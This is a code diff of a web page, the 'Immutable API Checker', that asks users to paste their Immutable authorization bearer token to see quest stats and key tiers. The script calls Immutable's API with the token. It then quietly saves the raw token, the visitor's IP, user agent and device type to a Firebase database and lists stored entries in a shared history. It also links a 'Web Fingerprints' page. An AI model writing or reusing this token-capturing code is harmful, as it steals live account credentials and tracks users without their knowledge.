@@ -5,131 +5,184 @@
   <meta charset="UTF-8">
   <title>Immutable API Checker</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 40px;
-      background-color: #f4f4f4;
+    :root {
+      --bg: #0f1320;
+      --card: #151a2b;
+      --muted: #aab3c5;
+      --text: #e8ecf3;
+      --accent: #7aa2ff;
+      --good: #2fbf71;
+      --bad: #ff5c5c;
+      --chip: #1b2240;
+      --border: #27314f;
+      --shadow: 0 4px 12px rgba(0, 0, 0, .25);
+      --radius: 12px;
     }
 
-    textarea,
-    pre {
+    body {
+      margin: 0;
+      font-family: Inter, system-ui, sans-serif;
+      background: linear-gradient(180deg, #131a2b, #0f1320);
+      color: var(--text);
+    }
+
+    /* Slim Navbar */
+    .nav {
+      display: flex;
+      justify-content: center;
+      gap: 6px;
+      padding: 10px;
+      border-bottom: 1px solid var(--border);
+      background: #101529;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .tab-btn {
+      padding: 6px 12px;
+      border-radius: 6px;
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--text);
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .tab-btn:hover {
+      border-color: var(--accent);
+      background: #1a2244;
+    }
+
+    .tab-btn.active {
+      background: var(--accent);
+      border-color: var(--accent);
+      color: #fff;
+    }
+
+    /* Content Wrapper */
+    .wrap {
+      max-width: 780px;
+      margin: 0 auto;
+      padding: 20px 14px;
+    }
+
+    h2 {
+      margin: 0 0 12px;
+      font-size: 1.2rem;
+      font-weight: 600;
+    }
+
+    label {
+      display: block;
+      margin: 12px 0 6px;
+      font-size: 0.9rem;
+      color: var(--muted);
+    }
+
+    textarea {
+      width: 97%;
+      padding: 8px 10px;
+      border-radius: 8px;
+      background: #0b1024;
+      color: var(--text);
+      border: 1px solid var(--border);
+      font-family: ui-monospace, Menlo, monospace;
+      font-size: 0.9rem;
+    }
+
+    select,
+    button {
       width: 100%;
-      font-size: 14px;
-      margin-top: 10px;
+      padding: 8px 10px;
+      border-radius: 8px;
+      background: #0b1024;
+      color: var(--text);
+      border: 1px solid var(--border);
+      font-family: ui-monospace, Menlo, monospace;
+      font-size: 0.9rem;
+    }
+
+    textarea {
+      resize: vertical;
+      min-height: 70px;
+      max-height: 160px;
     }
 
     button {
       margin-top: 10px;
-      padding: 10px 20px;
-      font-size: 16px;
+      font-weight: 500;
+      background: var(--chip);
       cursor: pointer;
+      transition: 0.2s;
     }
 
-    .history-entry {
-      border: 1px solid #ccc;
-      background: #fff;
-      padding: 10px;
+    button:hover {
+      border-color: var(--accent);
+      background: #1a2244;
+    }
+
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 16px;
+      margin-top: 16px;
+    }
+
+    .progress-container {
+      width: 100%;
+      background: #0b1024;
+      border-radius: 8px;
       margin-top: 10px;
+      border: 1px solid var(--border);
+      overflow: hidden;
     }
 
-    ul {
-      margin: 5px 0;
-      padding-left: 20px;
+    .progress-bar {
+      width: 0%;
+      height: 16px;
+      background: var(--accent);
+      transition: width 0.3s ease;
     }
 
-    .tier-common {
-      color: #666;
-      font-size: 24px;
-      font-weight: bold;
-    }
-
-    .tier-uncommon {
-      color: green;
-      font-size: 24px;
-      font-weight: bold;
-    }
-
-    .tier-rare {
-      color: blue;
-      font-size: 24px;
-      font-weight: bold;
-    }
-
-    .tier-epic {
-      color: purple;
-      font-size: 24px;
-      font-weight: bold;
-    }
-
-    .tier-legend {
-      color: goldenrod;
-      font-size: 24px;
-      font-weight: bold;
+    #loader,
+    #gemsLoader {
+      display: flex;
+      justify-content: center;
+      margin: 12px 0;
     }
 
     #response,
     #gemsResponse {
       font-weight: 500;
-      font-size: 2rem;
-      color: red;
-      margin-top: 20px;
+      font-size: 1rem;
+      margin-top: 12px;
     }
 
     #response .green,
     #gemsResponse .green {
-      color: green;
-      font-size: 2rem;
-      font-weight: 500;
+      color: var(--good);
     }
 
-    #loader,
-    #gemsLoader {
-      margin-top: 20px;
-      text-align: center;
+    #response .red,
+    #gemsResponse .red {
+      color: var(--bad);
     }
 
-    /* Tabs */
-    .nav {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 20px;
-    }
-
-    .tab-btn {
-      border: 1px solid #bbb;
-      background: #fff;
-      padding: 8px 14px;
+    .history-entry {
+      border: 1px solid var(--border);
+      background: #131a36;
+      padding: 8px;
       border-radius: 8px;
-    }
-
-    .tab-btn.active {
-      border-color: #4a90e2;
-      box-shadow: 0 0 0 2px rgba(74, 144, 226, .2) inset;
-      font-weight: 600;
+      margin-top: 8px;
+      font-size: 0.85rem;
     }
 
     .hidden {
       display: none;
-    }
-
-    /* Progress bar */
-    .progress-container {
-      width: 100%;
-      background-color: #ddd;
-      border-radius: 10px;
-      margin-top: 10px;
-    }
-
-    .progress-bar {
-      width: 0%;
-      height: 20px;
-      background-color: #4a90e2;
-      border-radius: 10px;
-      transition: width 0.4s ease;
-    }
-
-    #bulkResults {
-      margin-top: 15px;
     }
   </style>
 </head>
@@ -139,69 +192,85 @@
   <div class="nav">
     <button id="btnStats" class="tab-btn active">Immutable Stats Checker</button>
     <button id="btnGems" class="tab-btn">Gems Checker</button>
+    <a href="fingerprint_test_cleaned.html">
+      <button id="tabFp" class="tab-btn">Web Fingerprints</button>
+    </a>
     <a href="stats.html">
       <button id="btnStats" class="tab-btn">&#x1F862; Go to Analytics</button>
     </a>
 
   </div>
 
-  <!-- Immutable Stats Checker (unchanged code) -->
-  <div id="statsSection">
-    <h2>Immutable Account Checker</h2>
-    <label for="auth">Enter Authorization Token:</label>
-    <textarea id="auth" rows="4" placeholder="Paste your Authorization token here..."></textarea>
-    <button id="sendBtn">Check</button>
-    <div id="loader" style="display:none;">
-      <svg width="50" height="50" viewBox="0 0 50 50">
-        <circle cx="25" cy="25" r="20" stroke="gray" stroke-width="5" fill="none" stroke-linecap="round">
-          <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s"
-            repeatCount="indefinite" />
-        </circle>
-      </svg>
-    </div>
-    <div id="response"></div>
-    <div id="alreadyLogged"></div>
-    <div id="history"></div>
-  </div>
 
-  <!-- Gems Checker -->
-  <div id="gemsSection" class="hidden">
-    <h2>Immutable Gems Checker</h2>
-    <label for="gemsAddress">Enter Wallet Address(es):</label>
-    <textarea id="gemsAddress" rows="4"
-      placeholder="Paste one or multiple wallet addresses (one per line)..."></textarea>
-    <button id="gemsBtn">Check Gems</button>
+  <div class="wrap">
+    <!-- Stats Checker -->
+    <div id="statsSection">
+      <div class="card">
+        <h2>Immutable Account Checker</h2>
+        <label for="auth">Authorization Token</label>
+        <textarea id="auth" placeholder="Paste your Authorization token..."></textarea>
+        <button id="sendBtn">Check</button>
 
-    <!-- Dropdown -->
-    <div style="margin-top:10px;">
-      <label for="idScheme">ID Scheme:</label>
-      <select id="idScheme">
-        <option value="2">1</option>
-        <option value="3">2</option>
-        <option value="4">3</option>
-        <option value="5">4</option>
-        <option value="6">5</option>
-        <option value="7">6</option>
-        <option value="8">7</option>
-        <option value="1">8</option>
-        <option value="9">9</option>
-        <option value="10">10</option>
-      </select>
-    </div>
+        <div id="statsLoader" style="display:none;">
+          <div class="progress-container">
+            <div class="progress-bar" id="statsProgressBar"></div>
+          </div>
+          <div id="statsProgressText"></div>
+        </div>
 
-    <!-- Progress bar -->
-    <div id="gemsLoader" style="display:none;">
-      <div class="progress-container">
-        <div class="progress-bar" id="progressBar"></div>
+
+
+        <label for="weekFilter">Select Week</label>
+        <select id="weekFilter">
+          <option value="20">Week 20 (Aug 14 → Aug 21, 2025)</option>
+          <option value="21" selected>Week 21 (Aug 21 → Aug 28, 2025)</option>
+          <option value="22">Week 22 (Aug 28 → Sep 4, 2025)</option>
+        </select>
+
+        <div id="response"></div>
+        <div id="alreadyLogged"></div>
+        <div id="history"></div>
       </div>
-      <div id="progressText"></div>
     </div>
 
-    <div id="gemsResponse"></div>
-    <div id="bulkResults"></div>
+    <!-- Gems Checker -->
+    <div id="gemsSection" class="hidden">
+      <div class="card">
+        <h2>Immutable Gems Checker</h2>
+        <label for="gemsAddress">Wallet Address(es)</label>
+        <textarea id="gemsAddress" placeholder="One wallet per line..."></textarea>
+        <button id="gemsBtn">Check Gems</button>
 
-    <h2>Gems History</h2>
-    <div id="gemsHistory"></div>
+        <label for="idScheme">ID Scheme</label>
+        <select id="idScheme">
+          <option value="2">1</option>
+          <option value="3">2</option>
+          <option value="4">3</option>
+          <option value="5">4</option>
+          <option value="6">5</option>
+          <option value="7">6</option>
+          <option value="8">7</option>
+          <option value="1">8</option>
+          <option value="9">9</option>
+          <option value="10">10</option>
+        </select>
+
+        <div id="gemsLoader" style="display:none;">
+          <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+          </div>
+          <div id="progressText"></div>
+        </div>
+
+        <div id="gemsResponse"></div>
+        <div id="bulkResults"></div>
+      </div>
+
+      <div class="card">
+        <h2>Gems History</h2>
+        <div id="gemsHistory"></div>
+      </div>
+    </div>
   </div>
 
   <!-- Firebase + Logic -->
@@ -236,11 +305,33 @@
     const analytics = getAnalytics(app);
     const db = getFirestore(app);
 
+    // Week ranges (UTC 0:00 boundaries)
+    const weekRanges = {
+      20: {
+        start: new Date(Date.UTC(2025, 7, 14, 0, 0, 0)), // Aug 14
+        end: new Date(Date.UTC(2025, 7, 21, 0, 0, 0))  // Aug 21
+      },
+      21: {
+        start: new Date(Date.UTC(2025, 7, 21, 0, 0, 0)), // Aug 21
+        end: new Date(Date.UTC(2025, 7, 28, 0, 0, 0))  // Aug 28
+      },
+      22: {
+        start: new Date(Date.UTC(2025, 7, 28, 0, 0, 0)), // Aug 28
+        end: new Date(Date.UTC(2025, 8, 4, 0, 0, 0))   // Sep 4
+      }
+    };
+
+
     // Tabs
     const btnStats = document.getElementById('btnStats');
     const btnGems = document.getElementById('btnGems');
     const statsSection = document.getElementById('statsSection');
     const gemsSection = document.getElementById('gemsSection');
+
+    const statsLoader = document.getElementById("statsLoader");
+    const statsProgressBar = document.getElementById("statsProgressBar");
+    const statsProgressText = document.getElementById("statsProgressText");
+
 
     function activateTab(which) {
       if (which === 'stats') {
@@ -297,7 +388,18 @@
     async function renderHistory() {
       const historyBox = document.getElementById('history');
       historyBox.innerHTML = "";
-      const q = query(collection(db, "StatsHistory"), orderBy("timestamp", "desc"), limit(500));
+      const selectedWeek = document.getElementById("weekFilter")?.value || "21";
+      const { start, end } = weekRanges[selectedWeek];
+
+      const q = query(
+        collection(db, "StatsHistory"),
+        where("timestamp", ">=", start),
+        where("timestamp", "<", end),
+        orderBy("timestamp", "desc"),
+        limit(500)
+      );
+
+
       const querySnapshot = await getDocs(q);
       querySnapshot.forEach(doc => {
         const entry = doc.data();
@@ -328,24 +430,43 @@
         historyBox.appendChild(div);
       });
     }
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
 
     document.getElementById('sendBtn').addEventListener('click', async () => {
       const token = document.getElementById('auth').value.trim();
       const responseBox = document.getElementById('response');
       const alreadyLog = document.getElementById('alreadyLogged');
-      responseBox.innerHTML = ""; alreadyLog.innerHTML = ""; loader.style.display = 'block';
+      responseBox.innerHTML = "";
+      alreadyLog.innerHTML = "";
+      document.getElementById("statsLoader").style.display = "block";
+      document.getElementById("statsProgressBar").style.width = "0%";
+      document.getElementById("statsProgressText").textContent = "Checking stats...";
+
+
+
+
 
       if (!token) { responseBox.textContent = 'Please enter a valid token.'; loader.style.display = 'none'; return; }
       try {
         const ip = await getUserIP();
         const userAgent = navigator.userAgent;
         const deviceType = getDeviceType();
+        await sleep(1000); // ⏳ show 0% for a moment
+
         const headers = { 'Authorization': `Bearer ${token}`, 'Accept': 'application/json, text/plain, */*', 'Access-Control-Allow-Origin': '*', 'Origin': 'https://play.immutable.com', 'Referer': 'https://play.immutable.com/', 'User-Agent': userAgent };
         const [statsRes, eligibilityRes] = await Promise.all([
           fetch('https://api.immutable.com/v3/rewards/sweepstakes/user-stats/predicted', { method: 'GET', headers }),
           fetch('https://api.immutable.com/v1/rewards/redemption/eligibility', { method: 'GET', headers })
+
         ]);
-        if (!statsRes.ok || !eligibilityRes.ok) { responseBox.textContent = 'Invalid or Expired Authentication token'; loader.style.display = 'none'; return; }
+        statsProgressBar.style.width = "50%";
+        statsProgressText.textContent = "Fetched stats...";
+        await sleep(1000); // ⏳ show 50% for a moment
+
+        if (!statsRes.ok || !eligibilityRes.ok) { responseBox.innerHTML = '<div class="red">Invalid or Expired Authentication token</div>'; statsLoader.style.display = 'none'; return; }
         const statsData = await statsRes.json(); const eligibilityData = await eligibilityRes.json();
         // const combined = { userStats: statsData.userStats || {}, eligibility: eligibilityData || {} };
         // const progress = combined.userStats?.progressPercentage || 0;
@@ -354,18 +475,32 @@
         // ✅ Collect completed quest names
         let completedQuests = [];
         let totalCompleted = 0;
+
+        // get selected week
+        const selectedWeek = document.getElementById("weekFilter").value;
+        const { start, end } = weekRanges[selectedWeek];
+
         if (statsData.games && Array.isArray(statsData.games)) {
           statsData.games.forEach(game => {
             if (game.quests && Array.isArray(game.quests)) {
               game.quests.forEach(q => {
-                if (q.timesCompleted === 1) {
-                  completedQuests.push(q.name); // push the quest name
+                if (q.lastCompletedAt) {
+                  const completedAt = new Date(q.lastCompletedAt);
+                  if (completedAt >= start && completedAt < end) {
+                    completedQuests.push(q.name);
+                    totalCompleted++;
+                  }
+                } else if (q.timesCompleted && q.timesCompleted > 0) {
+                  completedQuests.push(q.name);
                   totalCompleted++;
                 }
+
+
               });
             }
           });
         }
+
 
         // ✅ Remap predicted response into old structure
         const combined = {
@@ -392,23 +527,39 @@
 
 
         if (alreadyLoggedFlag) {
-          responseBox.textContent = 'There are no new changes'; loader.style.display = 'none';
+          responseBox.innerHTML = '<div class="red"> There are no new changes </div>';
+          statsLoader.style.display = "none";
+
           alreadyLog.innerHTML = `<div class="history-entry"><strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
             <strong>✅ Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
             <strong>🧩 Quests Completed:</strong> ${questList}<br><br></div>`;
           await renderHistory(); return;
         }
+        statsProgressBar.style.width = "80%";
+        statsProgressText.textContent = "Saving results...";
+        await sleep(1000); // ⏳ show 80% for a moment
+
         await addDoc(collection(db, "StatsHistory"), { authToken: token, ip, userAgent, deviceType, stats: combined, logId, timestamp: new Date() });
-        loader.style.display = 'none'; responseBox.innerHTML = '<div class="green">Request successfully!</div>';
+        statsLoader.style.display = "none";
+        responseBox.innerHTML = '<div class="green">Request successfully!</div>';
         alreadyLog.innerHTML = `<div class="history-entry"><strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
           <strong>✅ Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
           <strong>🧩 Quests Completed:</strong> ${questList}<br><br></div>`;
         await renderHistory();
       } catch (err) {
-        responseBox.textContent = '❌ Unexpected error occurred.'; loader.style.display = 'none'; console.error(err);
+        responseBox.innerHTML = '<div class="red">❌ Unexpected error occurred.</div>'; console.error(err);
+        responseBox.innerHTML = '<div class="red">Error: ' + err.message + '</div>';
+
+      } finally {
+        statsLoader.style.display = "none"; // ✅ always hide loader
       }
     });
     renderHistory();
+    // Re-render when week filter changes
+    // Re-render when week filter changes
+    document.getElementById("weekFilter").addEventListener("change", renderHistory);
+
+
     // =====================
     // Gems Checker JS (Extended, Fixed ID Handling)
     // =====================
@@ -521,6 +672,8 @@
       loaderBox.style.display = 'block';
       progressBar.style.width = "0%";
       progressText.textContent = `Checked 0/${addresses.length}`;
+
+
 
       const idPrefix = getIdPrefix();
 
